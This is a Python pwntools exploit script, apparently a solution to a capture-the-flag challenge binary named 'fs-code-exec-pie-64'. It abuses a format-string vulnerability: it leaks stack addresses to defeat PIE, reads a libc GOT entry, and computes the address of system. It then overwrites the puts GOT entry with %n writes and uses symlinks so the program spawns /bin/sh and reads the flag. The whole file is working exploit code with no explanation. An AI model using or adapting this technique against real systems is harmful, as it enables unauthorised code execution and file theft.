from pwn import *
offset_code_base = 2104824
env = {'PATH' : '.:/bin:/usr/bin'}

# Requires a complex symlink from wierd chars to /bin/sh
if os.path.exists("Thank"):
    os.remove("Thank")
os.symlink("//bin/sh", "Thank")
if os.path.exists("you!"):
    os.remove("you!")
f = open("you!", "w")
f.write("cat flag")
f.close()


# This was for 64 bit dummy
system_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['system']
libc_start_main_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['__libc_start_main']
offset = system_init_addr - libc_start_main_init_addr

# Launch processs
p = process('./fs-code-exec-pie-64', env=env)
print(p.recvline())
p.sendline("%p" * 42)
data = p.recvline()
print(repr(data))
leak = int(data.split('x')[35][:12], 16)
print(hex(leak))
base_addr = leak - offset_code_base
print(hex(base_addr))

got_puts_addr = base_addr + 0x202020  # Address of the got entry
print(hex(got_puts_addr))
got_setregid_addr = base_addr + 0x202058 # Address of the got entry
print(hex(got_setregid_addr))
got_libc_start_main_addr = base_addr + 0x202040 # Address of the got entry
print(hex(got_libc_start_main_addr))

print(p.recvline())
print(p.recvline())
read_inp = '%7$s\0\0\0\0' + p64(got_libc_start_main_addr)
p.sendline(read_inp)
data = p.recvline()
data = data.split()[3]
l1 = [data, '\0', '\0']
data = ''.join(l1)
libc_start_main_addr = u64(data)
print(hex(libc_start_main_addr))

system_addr = libc_start_main_addr + offset
print(hex(system_addr))

low = system_addr % 0x1000000
print(hex(low))

high = system_addr / 0x1000000
print(hex(high))

print(low)
print(high)
diff = high - low
print(diff)

write_inp = '%' + str(low) + 'x%10$n%' + str(diff) + 'x%11$n\0\0\0\0' + p64(got_puts_addr) + p64(got_puts_addr + 3)

print(len(write_inp))
print(write_inp)
print(p.recvline())
p.sendline(write_inp)

p.interactive()
